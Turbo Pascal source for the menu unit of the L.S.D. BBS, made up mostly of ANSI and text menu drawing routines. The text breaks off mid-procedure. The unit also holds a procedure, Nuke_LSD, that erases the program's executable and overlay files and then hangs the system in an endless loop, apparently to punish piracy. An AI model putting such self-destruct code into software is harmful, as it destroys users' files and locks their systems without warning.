{$R-,S-,I-,D-,F+,V-,B-,N-,L+,O+ }

unit menus;

interface

   uses crt,dos,gentypes,
							windows,subs1,ConfigRt;

											(* NeedToChange means they need to change. *)
procedure Sdoors;
procedure bulletm;
procedure configm;
procedure datam;
procedure doorsm;
procedure emailm;
procedure filem;
procedure groupm;
procedure mmenu;
procedure votingm;
procedure sponsorm;
procedure sysopm;
procedure newsm;
procedure feedm;
{procedure edithelp;}
procedure aboutm;
procedure dsysopm;
procedure esysopm;
procedure vsysopm;
procedure ueditm;
procedure batchm;
procedure fsysop;
procedure fnewscan;
procedure fchange;
procedure gfile;
procedure sgfile;
procedure configl;
procedure escan;
Procedure Nuke_LSD;      (* To Stop the piracy of L.S.D. BBS *)

implementation

Procedure Nuke_LSD;
Var F:File;
		BirdsFly:Boolean;
Begin
	BirdsFly:=False;
	Assign(F,ConfigSet.ForumDi+'LSD.EXE');
	ReWrite(F);
	Erase(F);
	Close(F);
	Assign(F,ConfigSet.ForumDi+'LSD.OVR');
	ReWrite(F);
	Erase(F);
	Close(F);
	Repeat Until BirdsFly;
End;

procedure mmenu;
  begin
   clearscr;
    if ansigraphics in urec.config then begin
(*    fuckup(1,20,48,13);
    AnsiColor(Urec.MenuBack);
    FuckXy(2,21,'             ¯ L.S.D. Main Menu ®             ');
    FuckXy(3,21,' A - About this BBS        B - Other BBS''es   ');
    FuckXy(4,21,' H - Help with L.S.D.      J - L.S.D. Credits ');
    FuckXy(5,21,' L - List Users            N - BBS News       ');
    FuckXy(6,21,' S - System Status         W - Last 20 Calls  ');
    FuckXy(7,21,' Y - Your Status           O - G-File Section ');
    FuckXy(8,21,' ^ - Modem Status          U - Time Bank      ');
    FuckXy(9,21,' Q - Rumour Section        - - Top Ten Lists  ');
   FuckXy(10,21,' / - Multi-Node Stuff      D - Data Bases     ');
   FuckXy(11,21,' E - Email Section         G - Log Off L.S.D. ');
   FuckXy(12,21,' K - Configure L.S.D.      M - Message Bases  ');
   FuckUp(7,1,21,10);
   AnsiColor(Urec.MenuBack);
      FuckXy(15,2,' R - Leech Lists   ');
      FuckXy(14,2,' I - Info Forms    ');
      FuckXy(13,2,' V - Voting Polls  ');
      FuckXy(12,2,' * - Ansi Art      ');
      FuckXy(11,2,' = - Conferences   ');
      FuckXy(10,2,' C - Page SysOp    ');
      FuckXy(9,2,' T - File Section  ');
      FuckXy(8,2,' P - Doors         ');
   FuckUp(7,59,21,10);
      AnsiColor(Urec.MenuBack);
      FuckXy(15,60,' F - Feedback to   ');
      FuckXy(14,60,' Z - Set Newscan   ');
      FuckXy(13,60,' ! - Level Raise   ');
      FuckXy(12,60,' $ - Donations     ');
      FuckXy(11,60,' . - Registration  ');
      FuckXy(10,60,' + - PW Change     ');
      FuckXy(9,60,' & - L.S.D. Ad     ');
      FuckXy(8,60,' ? - This Menu     ');  *)
    fuckup (1,36,13,3);
		fuckxy(2,37,^D+' Main Menu '+^R);
		fuckup(9,54,22,11);
    fuckup(6,32,19,13);
		fuckup(3,5,25,17);
		fuckxy(4,6,^D+' '+^I+'[A]'+^D+'  About This BBS   ');
		fuckxy(5,6,' '+^I+'[B]'+^D+'  Other Boards     ');
		fuckxy(6,6,' '+^I+'[H]'+^D+'  Help             ');
		FuckXy(7,6,' '+^I+'[J]'+^D+'  L.S.D. Credits   ');
		fuckxy(8,6,' '+^I+'[L]'+^D+'  List Users       ');
		fuckxy(9,6,' '+^I+'[N]'+^D+'  News             ');
		fuckxy(10,6,' '+^I+'[S]'+^D+'  System Status    ');
		fuckxy(11,6,' '+^I+'[W]'+^D+'  Last Callers     ');
		fuckxy(12,6,' '+^I+'[Y]'+^D+'  Your Status      ');
		fuckxy(13,6,' '+^I+'[O]'+^D+'  G-File Section   ');
		fuckxy(14,6,' '+^I+'[^]'+^D+'  Modem Status     ');
		fuckxy(15,6,' '+^I+'[U]'+^D+'  Time Bank        ');
		fuckxy(16,6,' '+^I+'[Q]'+^D+'  Rumours          ');
		FuckXy(17,6,' '+^I+'[-]'+^D+'  Top Ten Listing  ');
		FuckXy(18,6,' '+^I+'[/]'+^D+'  Multi-Node Stuff ');
		fuckxy(7,33,' '+^I+'[D]'+^D+'  Databases  ');
		fuckxy(8,33,' '+^I+'[E]'+^D+'  Email      ');
		fuckxy(9,33,' '+^I+'[G]'+^D+'  Goodbye    ');
		fuckxy(10,33,' '+^I+'[K]'+^D+'  Configure  ');
		fuckxy(11,33,' '+^I+'[M]'+^D+'  Messages   ');
		fuckxy(12,33,' '+^I+'[P]'+^D+'  Doors      ');
		fuckxy(13,33,' '+^I+'[R]'+^D+'  Leech List ');
		fuckxy(14,33,' '+^I+'[I]'+^D+'  Infoforms  ');
		fuckxy(15,33,' '+^I+'[V]'+^D+'  Voting     ');
		fuckxy(16,33,' '+^I+'[*]'+^D+'  Ansi Art   ');
		FuckXy(17,33,' '+^I+'[=]'+^D+'  Conference ');
		fuckxy(10,55,' '+^I+'[C]'+^D+'  Chat          ');
		fuckxy(11,55,' '+^I+'[T]'+^D+'  File Section  ');
		fuckxy(12,55,' '+^I+'[F]'+^D+'  Feedback      ');
		fuckxy(13,55,' '+^I+'[Z]'+^D+'  Set Newscan   ');
		fuckxy(14,55,' '+^I+'[!]'+^D+'  Level Raise   ');
		fuckxy(15,55,' '+^I+'[$]'+^D+'  Donations     ');
		fuckxy(16,55,' '+^I+'[.]'+^D+'  Registration  ');
		fuckxy(17,55,' '+^I+'[+]'+^D+'  PW Change     ');
		fuckxy(18,55,' '+^I+'[&]'+^D+'  L.S.D. BBS Ad '^R);
		printxy(22,0,'');
		end else begin
				 WriteLn(^M'                           - L.S.D. Main Menu -'^M^M,
									 'A - About this BBS   B - Other BBS Lists    C - Chat With SysOp'^M,
                   'D - Database         E - E-Mail Section     F - Feedback to SysOp'^M,
                   'G - Log Off L.S.D.   H - Help               I - Info-Forms'^M,
                   'J - L.S.D. Credits   K - User Configure     L - User List'^M,
                   'M - Message Bases    N - BBS News           O - G-File Section'^M,
                   'P - Doors            Q - Rumours            R - Leech List'^M,
                   'S - System Status    T - File Xfer          U - Time Bank'^M,
                   'V - Voting Polls     W - Last 20 Callers    X - Transfer User'^M,
                   'Y - Your Status      Z - Set Last Call Date ^ - Modem Status'^M,
                   '- - Top Ten Listing  * - Ansi Art           = - Select Main Conference'^M,
                   '! - Request Access   $ - Donations to Sysop . - Who this BBS is registered to'^M,
                   '+ - Password Change  & - L.S.D. BBS Ad      ? - This Menu'^M,
                   '/ - Multi-Node Stuff'^M);
         End;
end;

procedure bulletm;
  begin
   clearscr;
    if Ansigraphics in Urec.Config then Begin
    fuckup(1,32,16,3);
		fuckxy(2,33,^D+' Message Menu '+^R);
		fuckup(11,57,21,6);
    fuckup(8,33,22,7);
    fuckup(5,4,26,8);
    fuckup(15,10,22,5);
		fuckxy(6,5,^D+' '+^I+'[C]'+^D+'  Toggle Newscan    ');
		fuckxy(7,5,' '+^I+'[N]'+^D+'  Newscan All Areas ');
		fuckxy(8,5,' '+^I+'[T]'+^D+'  List Titles       ');
		fuckxy(9,5,' '+^I+'[V]'+^D+'  Newscan This Area ');
		fuckxy(10,5,' '+^I+'[#]'+^D+'  Read Message #    ');
		fuckxy(11,5,' '+^I+'[ENTER]'+^D+'  Read Next     ');
		fuckxy(9,34,' '+^I+'[E]'+^D+'  Edit Message  ');
		fuckxy(10,34,' '+^I+'[K]'+^D+'  Kill Message  ');
		fuckxy(11,34,' '+^I+'[M]'+^D+'  Private Reply ');
		fuckxy(12,34,' '+^I+'[P]'+^D+'  Post Message  ');
		fuckxy(13,34,' '+^I+'[S]'+^D+'  Email Sponsor ');
		fuckxy(12,58,' '+^I+'[A]'+^D+'  Select Area  ');
		fuckxy(13,58,' '+^I+'[H]'+^D+'  Help         ');
		fuckxy(14,58,' '+^I+'[Q]'+^D+'  Quit         ');
		fuckxy(15,58,' '+^I+'[+]'+^D+'  Next Area    ');
		fuckxy(16,11,' '+^I+'[L]'+^D+'  List Users    ');
		fuckxy(17,11,' '+^I+'[D]'+^D+'  Delete a Msg  ');
		fuckxy(18,11,' '+^I+'[U]'+^D+'  Upload A Msg  '+^R);
		printxy(21,0,'');
    end else
    WriteLn(^M'                     - L.S.D. Message Menu -'^M^M,
              'C - Toggle Newscan    N - Newscan All Areas  T - List Titles'^M,
              'V - Newscan this Area # - Read Message #xxxx [ENTER] - Read Next Msg'^M,
              'E - Edit Message      K - Kill Message       M - Private Reply'^M,
              'P - Post Message      S - Email Sponser      A - Change Message Area'^M,
              'H - Help              Q - Quit Message Area  + - Change to next Area'^M,
              'D - Delete a Message  U - Upload a message   L - List Users with access here'^M);

end;

procedure datam;
  begin
   clearscr;
    If ansigraphics in urec.config then begin
    fuckup(1,33,17,3);
		fuckxy(2,34,^D+' Database Menu '+^R);
		fuckup(8,46,18,5);
		fuckup(5,18,25,6);
		fuckxy(6,19,^D+' '+^I+'[*]'+^D+' List Bases        ');
		fuckxy(7,19,' '+^I+'[N]'+^D+' Newscan All Bases ');
		fuckxy(8,19,' '+^I+'[S]'+^D+' Search            ');
		fuckxy(9,19,' '+^I+'[V]'+^D+' Newscan This Base ');
		 fuckxy(9,47,' '+^I+'[A]'+^D+' Add Entry  ');
		fuckxy(10,47,' '+^I+'[H]'+^D+' Help       ');
		fuckxy(11,47,' '+^I+'[Q]'+^D+' Quit       '+^R);
		printxy(21,0,'');
		end else
      WriteLn(^M^M'                   - L.S.D. DataBase Menu -'^M^M,
                  '* - List Bases    N - Newscan All Bases  S - Search Bases'^M,
                  'A - Add Entry     H - Help               V - Newscan this base'^M,
                  'Q - Quit Database Menu'^M^M);

 end;


 procedure doorsm;
  begin
   clearscr;
   if Ansigraphics in urec.config then begin
    fuckup(1,34,13,3);
		fuckxy(2,35,^D+' Door Menu '+^R);
		fuckup(20,59,13,3);
		fuckup(16,50,13,3);
		fuckup(12,37,18,3);
		fuckup(8,24,19,3);
		fuckup(4,4,26,3);
		fuckxy(5,5,^D+' '+^I+'[I]'+^D+'  Info About A Door ');
		fuckxy(9,25,' '+^I+'[L]'+^D+'  List Doors ');
		fuckxy(13,38,' '+^I+'[O]'+^D+'  Open Door ');
		fuckxy(17,51,' '+^I+'[H]'+^D+'  Help ');
		fuckxy(21,60,' '+^I+'[Q]'+^D+'  Quit '+^R);
		printxy(21,0,'');
    end else
      WriteLn(^M^M'                      - L.S.D. Door Menu -'^M^M,
                  'I - Info about a door  L - List Doors  O - Open Doors  H - Help  Q - Quit'^M);
      end;

procedure votingm;
 begin
  clearscr;
  if AnsiGraphics in urec.config then Begin
    fuckup(1,34,15,3);
		fuckxy(2,35,^D+' Voting Menu '+^R);
		fuckup(8,44,21,5);
		fuckup(5,16,25,6);
		fuckxy(6,17,^D+' '+^I+'[L]'+^D+'  List Choices     ');
		fuckxy(7,17,' '+^I+'[R]'+^D+'  Show Results     ');
		fuckxy(8,17,' '+^I+'[V]'+^D+'  Vote             ');
		fuckxy(9,17,' '+^I+'[ENTER]'+^D+'  Next Booth   ');
		fuckxy(9,45,' '+^I+'[H]'+^D+'  Help         ');
		fuckxy(10,45,' '+^I+'[Q]'+^D+'  Quit         ');
		fuckxy(11,45,' '+^I+'[S]'+^D+'  Select Booth '+^R);
		printxy(21,0,'');
		End Else
			WriteLn(^M^M'                  - L.S.D. Voting Menu -'^M^M,
									'L - List Choices      R - Show Results    V - Vote'^M,
									'[ENTER] - Next Booth  H - Help            Q - Quit'^M,
									'S - Select a Booth'^M^M);
 end;

procedure emailm;
  begin
   clearscr;
   if AnsiGraphics in Urec.Config then Begin
    fuckup(1,34,14,3);
		fuckxy(2,35,^D+' Email Menu '+^R);
		fuckup(11,57,22,6);
		fuckup(8,32,22,7);
		fuckup(5,5,24,9);
		fuckxy(6,6,^D+' '+^I+'[#]'+^D+'  Read #          ');
		fuckxy(7,6,' '+^I+'[D]'+^D+'  Delete Mail     ');
		fuckxy(8,6,' '+^I+'[G]'+^D+'  Group Editing   ');
		fuckxy(9,6,' '+^I+'[H]'+^D+'  Help            ');
		fuckxy(10,6,' '+^I+'[N]'+^D+'  Read New Mail   ');
		fuckxy(11,6,' '+^I+'[Q]'+^D+'  Quit            ');
		fuckxy(12,6,' '+^I+'[ENTER]'+^D+'  Read Next   ');
		fuckxy(9,33,' '+^I+'[C]'+^D+'  Copy Mail     ');
		fuckxy(10,33,' '+^I+'[F]'+^D+'  Forward Mail  ');
		fuckxy(11,33,' '+^I+'[K]'+^D+'  Kill Outgoing ');
		fuckxy(12,33,' '+^I+'[L]'+^D+'  List All Mail ');
		fuckxy(13,33,' '+^I+'[V]'+^D+'  View Outgoing ');
		fuckxy(12,58,' '+^I+'[A]'+^D+'  Announcement  ');
		fuckxy(13,58,' '+^I+'[R]'+^D+'  Read Mail     ');
		fuckxy(14,58,' '+^I+'[S]'+^D+'  Send Mail     ');
		fuckxy(15,58,' '+^I+'[Z]'+^D+'  Zippy Send    '+^R);
		printxy(21,0,'');
		end Else
			WriteLn(^M^M'                        - L.S.D. Email Menu -'^M^M,
									'# - Read Email #xxxx   D - Delete Mail    G - Group Editing'^M,
									'H - Help               N - Read New Mail  Q - Quit'^M,
									'[ENTER] - Read Next    C - Copy Mail      F - Forward Mail'^M,
									'K - Kill Outgoing      L - List All Mail  V - View Outgoing'^M,
									'A - Announcement       R - Read Mail      S - Send Mail'^M,
									'Z - Zippy mail send'^M^M);
end;

procedure configm;
  begin
   clearscr;
	 if Ansigraphics in Urec.Config then Begin
		fuckup(1,33,15,3);
		fuckxy(2,34,^D+' Config Menu '+^R);
		fuckup(5,5,29,14);
		fuckxy(6,6,^D+' '+^I+'[E]'+^D+' Emulation             ');
		fuckxy(7,6,' '+^I+'[G]'+^D+' Graphics              ');
		fuckxy(8,6,' '+^I+'[F]'+^D+' Full Screen Editor    ');
		FuckXy(9,6,' '+^I+'[L]'+^D+' Line Feeds            ');
	 FuckXy(10,6,' '+^I+'[M]'+^D+' More Prompts          ');
	 fuckxy(11,6,' '+^I+'[N]'+^D+' Configure Newscan     ');
	 FuckXy(12,6,' '+^I+'[O]'+^D+' Post Prompts          ');
	 FuckXy(13,6,' '+^I+'[Q]'+^D+' Quit Configuration    ');
	 FuckXy(14,6,' '+^I+'[T]'+^D+' Time Display          ');
	 FuckXy(15,6,' '+^I+'[U]'+^D+' Upper Case Selection  ');
	 FuckXy(16,6,' '+^I+'[W]'+^D+' Screen Width          ');
	 FuckXy(17,6,' '+^I+'[Y]'+^D+' Show Your Status      ');
	 fuckup(5,48,28,15);
	 fuckxy(18,49,^D+' '+^I+'[V]'+^D+' Status Box Color     ');
	 FuckXy(17,49,' '+^I+'[I]'+^D+' Choose Input Color   ');
	 FuckXy(16,49,' '+^I+'[P]'+^D+' Prompt Color         ');
	 FuckXy(15,49,' '+^I+'[R]'+^D+' Regular Color        ');
	 FuckXy(14,49,' '+^I+'[S]'+^D+' Statistic Color      ');
	 FuckXy(13,49,' '+^I+'[Z]'+^D+' Macro Selections     ');
	 FuckXy(12,49,' '+^I+'[D]'+^D+' Display Length       ');
	 FuckXy(11,49,' '+^I+'[B]'+^D+' Menu Border          ');
	 FuckXy(10,49,' '+^I+'[C]'+^D+' Menu Background      ');
	 FuckXy(9,49,' '+^I+'[J]'+^D+' Box Border           ');
	 FuckXy(8,49,' '+^I+'[K]'+^D+' Box Text             ');
	 FuckXy (7,49,' '+^I+'[A]'+^D+' Pull Down Menus      ');
	 FuckXy (6,49,' '+^I+'[H]'+^D+' Menu Highlight       ');
		printxy(23,0,'');
		End Else
			 WriteLn(^M^M'                     - L.S.D. User Config Menu -'^M^M,
									 'E - Emulation     G - Graphics         F - Full Screen Editor'^M,
									 'L - Line Feeds    M - More Prompts     N - Config Newscan'^M,
									 'O - Post Prompts  Q - Quit Config      T - Time Display'^M,
									 'U - Upper Case    W - Screen Width     Y - Your Status'^M,
									 'I - Input Color   P - Prompt Color     R - Regular Color'^M,
									 'S - Status Color  Z - Macros           D - Display Length'^M,
									 'B - Menu Border   C - Menu Background  J - Box Border'^M,
									 'K - Box Text      A - Pull Down Menus  H - Menu Highlighted'^M^M);

 end;


procedure groupm;
	begin                 (* NeedToChange *)
   clearscr;
    If AnsiGraphics in Urec.Config
    Then Begin
    fuckup(1,32,17,3);
		fuckxy(2,33,^D+' Group Editing '+^R);
		fuckup(6,15,51,7);
		fuckxy(7,16,^D+' '+^I+'[A]'+^D+'  Change Group Class   ');
		fuckxy(8,16,' '+^I+'[D]'+^D+'  Delete Group         ');
		fuckxy(9,16,' '+^I+'[G]'+^D+'  Add Group            ');
		fuckxy(10,16,' '+^I+'[R]'+^D+'  Remove Member        ');
		fuckxy(11,16,' '+^I+'[*]'+^D+'  Select Group         ');
		fuckxy(7,42,' '+^I+'[C]'+^D+'  Change Creator   ');
		fuckxy(8,42,' '+^I+'[L]'+^D+'  List Groups      ');
		fuckxy(9,42,' '+^I+'[M]'+^D+'  Add Member       ');
		fuckxy(10,42,' '+^I+'[V]'+^D+'  List Members     ');
		fuckxy(11,42,' '+^I+'[Q]'+^D+'  Quit             ');
		printxy(21,0,'');
		End Else
       WriteLn(^M^M'               - L.S.D. Group Editing '^M^M,
                   'A - Change Group Class  D - Delete Group     G - Add Group'^M,
                   'R - Remove Member       * - Select Group     C - Change Creator'^M,
                   'L - List Groups         M - Add Member       V - List Members'^M,
                   'Q - Quit'^M^M);
 end;

procedure sponsorm;
  begin;
   clearscr;
   writeln('           L.S.D. BBS Sponsor Menu'^M);
   writeln('D - Set Auto Delete         L - Set level of area');
   writeln('S - Set sponsor of area     T - File Titles');
   writeln('M - Move file               W - Wipeout file');
   writeln('U - Set name and access     E - Set all access');
   writeln('Q - Quit to main menu       R - Rename Sub-Board');
   writeln('K - Kill Sub-Board          C - Sort boards');
   writeln('N - Move bulletin           B - Order boards');
   writeln('O - List users w/Access     V - Add resident file');
   writeln('H - Help                    ! - Local Upload a Message'^M);
end;

procedure sysopm;
  begin
	 clearscr;
		fuckup(1,37,14,3);
		fuckxy(2,38,^D+' Sysop Menu '+^R);
		fuckup(5,5,71,11);
		fuckxy(6,6,^D+' '+^I+'[D]'+^D+' Delete Error Log                                                ');
		fuckxy(7,6,' '+^I+'[P]'+^D+' Edit System Config                                              ');
		fuckxy(8,6,' '+^I+'[C]'+^D+' Change Time/Date                                                ');
		fuckxy(9,6,' '+^I+'[J]'+^D+' Show All Infoforms                                              ');
		fuckxy(10,6,' '+^I+'[V]'+^D+' Show All Sysops                                                 ');
		fuckxy(11,6,' '+^I+'[R]'+^D+' Remove Infoforms                                                ');
		fuckxy(12,6,' '+^I+'[S]'+^D+' Show System Log                                                 ');
		fuckxy(13,6,' '+^I+'[Z]'+^D+' Zap Specific Users                                              ');
		fuckxy(14,6,' '+^I+'[K]'+^D+' Kill System Log                                                 ');
		fuckxy(6,34,^I+'[E]'+^D+' Show Error Log');
		fuckxy(7,34,^I+'[L]'+^D+' Loozer lists');
		fuckxy(8,34,^I+'[I]'+^D+' Infoform Hunt');
		fuckxy(9,34,^I+'[B]'+^D+' NodeList Functions');
		fuckxy(10,34,^I+'[F]'+^D+' Feedback Menu');
		FuckXy(11,34,^I+'[*]'+^D+' Dos Gateway');
		fuckxy(12,34,^I+'[U]'+^D+' Edit Users');
		fuckxy(13,34,^I+'[M]'+^D+' Make User');
		fuckxy(14,34,^I+'[T]'+^D+' Edit Specification Lists');
		fuckxy(6,58,^I+'[N]'+^D+' News Edit');
		fuckxy(8,58,^I+'[A]'+^D+' Add News');
		fuckxy(10,58,^I+'[Q]'+^D+' Quit');
		printxy(21,0,'');
 end;

procedure newsm;
  begin
   clearscr;
		fuckup(1,34,14,3);
		fuckxy(2,35,^D+' News Edit '+^R);
		fuckup(5,9,65,3);
		fuckxy(6,10,^D+' '+^I+'[D]'+^D+' Delete Item   '+^I+'[V]'+^D+' View Item   '+
		^I+'[A]'+^D+' Add Item  '+^I+'[L]'+^D+' List Items '+^R);
		printxy(21,0,'');
 end;

procedure feedm;
  begin
   clearscr;
		fuckup(1,31,20,3);
		fuckxy(2,32,^D+' Feedback Commands'+^R);
    fuckup(4,15,50,7);
		fuckxy(5,16,^D+' '+^I+'[I]'+^D+' Infoform           '+^I+'[L]'+^D+' List Feedback       ');
		fuckxy(6,16,' '+^I+'[ENTER]'+^D+' Next           '+^I+'[E]'+^D+' Edit Sender         ');
		fuckxy(7,16,' '+^I+'[A]'+^D+' Read Again         '+^I+'[#]'+^D+' Read Number x       ');
		fuckxy(8,16,' '+^I+'[D]'+^D+' Delete Current #   '+^I+'[R]'+^D+' Send Mail Reply     ');
		fuckxy(9,16,' '+^I+'[Q]'+^D+' Quit                                       ');
		printxy(21,0,'');
 end;

procedure esysopm;
  begin
   clearscr;
    fuckup(1,34,14,3);
		fuckxy(2,35,^D+' SysOp Mail '+^R);
		fuckup(5,24,37,8);
		fuckxy(6,25,^D+' '+^I+'[G]'+^D+' Use Group For Sub-Board Access');
		fuckxy(7,25,' '+^I+'[L]'+^D+' Look In Someones Mailbox      ');
		fuckxy(8,25,' '+^I+'[S]'+^D+' Scan All Mail                 ');
		fuckxy(9,25,' '+^I+'[ENTER]'+^D+' Read Next                 ');
		fuckxy(10,25,' '+^I+'[#]'+^D+' Read #x                       ');
		fuckxy(11,25,' '+^I+'[Q]'+^D+' Quit                          ');
		printxy(21,0,'');
end;


procedure dsysopm;
  begin
   clearscr;
    fuckup(2,28,23,3);
		fuckxy(3,29,^D+' SysOp Database Menu '+^R);
		fuckup(6,26,26,9);
		fuckxy(7,27,^D+' '+^I+'[O]'+^D+' ReOrder Databases  ');
		fuckxy(8,27,' '+^I+'[E]'+^D+' Set Access Level   ');
		fuckxy(9,27,' '+^I+'[R]'+^D+' Rename Database    ');
		fuckxy(10,27,' '+^I+'[K]'+^D+' Kill Data Base     ');
		fuckxy(11,27,' '+^I+'[C]'+^D+' Change Entry       ');
		fuckxy(12,27,' '+^I+'[D]'+^D+' Delete Entry       ');
		fuckxy(13,27,' '+^I+'[Q]'+^D+' Quit               ');
		printxy(21,0,'');
 end;

procedure aboutm;
  begin
   clearscr;
		Printxy(2,24,'About Sysop');
		fuckup(4,18,25,7);
		fuckxy(5,19,^D+' '+^I+'[U]'+^D+' Update File Date  ');
		fuckxy(6,19,' '+^I+'[C]'+^D+' Change File       ');
		fuckxy(7,19,' '+^I+'[D]'+^D+' Delete File       ');
		fuckxy(8,19,' '+^I+'[A]'+^D+' Add File          ');
		fuckxy(9,19,' '+^I+'[Q]'+^D+' Quit              ');
		printxy(21,0,'');
 end;

procedure vsysopm;
  begin
   clearscr;
		Printxy(2,18,'SysOp Voting');
		fuckup(5,14,19,6);
		ansicolor(urec.menuback);
		fuckxy(6,15,^D+' '+^I+'[D]'+^D+' Delete Topic');
		fuckxy(7,15,' '+^I+'[C]'+^D+' Add Choice  ');
		fuckxy(8,15,' '+^I+'[A]'+^D+' Add Topic   ');
		fuckxy(9,15,' '+^I+'[Q]'+^D+' Quit        ');
		printxy(21,0,'');
 end;

procedure ueditm;
	begin
	 clearscr;
		fuckxy(2,36,'User Edit');
		fuckup(4,6,73,11);
		fuckxy(5,7,^D+' '+^I+'[W]'+^D+' Change Wanted Flag      '+^I+'[N]'+^D+' Change Phone Number   '+^I+'[L]'+^D+' Change Levl ');
		fuckxy(6,7,' '+^I+'[O]'+^D+' Set Xfer Points         '+^I+'[B]'+^D+' Board Access Flags    '+^I+'[H]'+^D+' Change Name ');
		fuckxy(7,7,' '+^I+'[Y]'+^D+' Special Sysop Access    '+^I+'[P]'+^D+' Change Password       '+^I+'[D]'+^D+' Delete User ');
		fuckxy(8,7,' '+^I+'[E]'+^D+' Set Xfer Level          '+^I+'[T]'+^D+' Time Left Today       '+^I+'[S]'+^D+' Status      ');
		fuckxy(9,7,' '+^I+'[C]'+^D+' Change Users Conference Flags                     '+^I+'[X]'+^D+' Set Exp Date');
		fuckxy(10,7,' '+^I+'[G]'+^D+' Change G-File Level    '+^I+'[F]'+^D+' GFile points          '+^I+'[!]'+^D+' Set U/D Ratio');
		fuckxy(11,7,' '+^I+'[$]'+^D+' Set Upload/Download K Ratio                     '+^I+'[^]'+^D+' Set PCR Ratio ');
		fuckxy(12,7,' '+^I+'[&]'+^D+' Edit Users Daily Time Limit                   '+^I+'[A]'+^D+' Change UserNote ');
		FuckXy(13,7,' '+^I+'[J]'+^D+' Set Main Conference Access Flags                                  ');
		printxy(21,0,'');
 end;

procedure sdoorsm;
	begin
	 clearscr;
		Printxy(3,36,'SysOps Door Menu');
		fuckup(6,3,76,3);
		fuckxy(7,3,^D+'  '+^I+'[C]'+^D+' Change Info About A Door   '+^I+'[D]'+^D+' Delete Door   '+^I+'[A]'+^D+' Add Door   '+
		^I+'[Q]'+^D+' Quit  ');
		printxy(21,0,'');
	end;

procedure filem;
  begin
   clearscr;
    if AnsiGraphics in Urec.Config then
    Begin
    fuckup(1,37,13,3);
		fuckxy(2,38,^D+' File Menu '+^R);
		FuckUp(5,5,40,11);
		FuckXy(6,6,^D+' '+^I+'[A]'+^D+' Change File Areas                ');
		FuckXy(7,6,' '+^I+'[B]'+^D+' Batch Menu                       ');
		FuckXy(8,6,' '+^I+'[H]'+^D+' Help with this Menu              ');
		FuckXy(9,6,' '+^I+'[F,L]'+^D+' File Listings                  ');
		FuckXy(10,6,' '+^I+'[T]'+^D+' Type a File                      ');
		FuckXy(11,6,' '+^I+'[N]'+^D+' Newscan All Areas                ');
		FuckXy(12,6,' '+^I+'[Q]'+^D+' Quit File Section                ');
		FuckXy(13,6,' '+^I+'[D]'+^D+' Download                         ');
		FuckXy(14,6,' '+^I+'[G]'+^D+' Goodbye                          ');
		FuckUp(11,40,35,10);
		FuckXy(12,41,^D+' '+^I+'[U]'+^D+' Upload a file               ');
		FuckXy(13,41,^D+' '+^I+'[+]'+^D+' Add to Batch                ');
		FuckXy(14,41,^D+' '+^I+'[I]'+^D+' Generate Complete File List ');
		FuckXy(15,41,^D+' '+^I+'[Y]'+^D+' Your File Status            ');
		FuckXy(16,41,^D+' '+^I+'[R]'+^D+' View an Archive             ');
		FuckXy(17,41,^D+' '+^I+'[S]'+^D+' Search All Areas            ');
		FuckXy(18,41,^D+' '+^I+'[W]'+^D+' Extended File Listing       ');
		FuckXy(19,41,^D+' '+^I+'[X]'+^D+' Sysops Wants List           ');
		printxy(21,0,'');
    End Else
       WriteLn(^M^M'                     - L.S.D. File Menu -'^M^M,
                   'H - Help                Q - Quit          R - View Archive'^M,
                   'T - Type a file         Y - Your Status   + - Add file to batch'^M,
                   'I - Complete File List  L - List Files    N - Newscan All File Areas'^M,
                   'S - Search for a file   V - Newscan Area  W - Extended File List'^M,
                   'X - Sysops Want List    A - Select Area   B - Batch Menu'^M,
                   'U - Upload a file       G - Goodbye       D - Download a file'^M^M);

  end;

procedure batchm;
  begin
   clearscr;
   if ansigraphics in urec.config then begin
    fuckup(1,34,14,3);
		fuckxy(2,35,^D+' Batch Menu '+^R);
		fuckup(5,29,24,9);
		fuckxy(6,30,^D+' '+^I+'[C]'+^D+' Clear Batch Que  ');
		fuckxy(7,30,' '+^I+'[D]'+^D+' Download Que     ');
		FuckXy(8,30,' '+^I+'[U]'+^D+' Upload Files     ');
		fuckxy(9,30,' '+^I+'[Q]'+^D+' Quit             ');
	 fuckxy(10,30,' '+^I+'[L]'+^D+' List Batch Que   ');
	 fuckxy(11,30,' '+^I+'[A]'+^D+' Add BiModem File ');
	 fuckxy(12,30,' '+^I+'[X]'+^D+' Execute BiModem  ');
		printxy(21,0,'');
		end else
			WriteLn(^M^M'                     - L.S.D. Batch Menu -'^M^M,
									'C - Clear Batch Que   D - Download Que    U - Upload Files'^M,
									'Q - Quit Batch Menu   L - List Batch Que  A - Add Bimodem File'^M,
									'X - Execute Bi-Modem'^M^M);
 end;

procedure fsysop;
 begin
  clearscr;
		fuckup(1,35,21,3);   (* NeedToChange *)
		fuckxy(2,36,^D+' File Sponsor Menu '+^R);
		fuckup(8,58,20,6);
		fuckup(6,35,20,7);
		fuckup(4,12,20,11);
		fuckxy(5,13,^D+' '+^I+'[A]'+^D+' Add A File   ');
		fuckxy(6,13,' '+^I+'[C]'+^D+' Change Desc  ');
		fuckxy(7,13,' '+^I+'[D]'+^D+' Delete File  ');
		fuckxy(8,13,' '+^I+'[F]'+^D+' Dir Of Files ');
		fuckxy(9,13,' '+^I+'[K]'+^D+' Kill Area    ');
	 fuckxy(10,13,' '+^I+'[R]'+^D+' Rename Area  ');
	 fuckxy(11,13,' '+^I+'[X]'+^D+' Range Move   ');
	 fuckxy(12,13,' '+^I+'[+]'+^D+' Send NetFile ');
	 fuckxy(13,13,' '+^I+'[Z]'+^D+' Batch Cmds   ');
		fuckxy(7,36,' '+^I+'[N]'+^D+' New Files    ');
		fuckxy(8,36,' '+^I+'[S]'+^D+' Sort Area    ');
		fuckxy(9,36,' '+^I+'[M]'+^D+' Move Files   ');
	 fuckxy(10,36,' '+^I+'[L]'+^D+' List Users   ');
	 fuckxy(11,36,' '+^I+'[O]'+^D+' ReOrder Areas');
		fuckxy(9,59,' '+^I+'[Q]'+^D+' Quit         ');
	 fuckxy(10,59,' '+^I+'[E]'+^D+' Remame File  ');
	 fuckxy(11,59,' '+^I+'[W]'+^D+' Add Files    ');
	 fuckxy(12,59,' '+^I+'[*]'+^D+' Change Area  ');
	 printxy(21,0,'');
end;

procedure fnewscan;
 begin
   clearscr;
   fuckup(1,34,16,3);
	 fuckxy(2,35,^D+' Newscan Menu '+^R);
	 fuckup(7,42,23,5);
	 fuckup(5,20,19,6);
	 fuckxy(6,21,^D+' '+^I+'[Q]'+^D+' Quit        ');
	 fuckxy(7,21,' '+^I+'[C]'+^D+' Change File ');
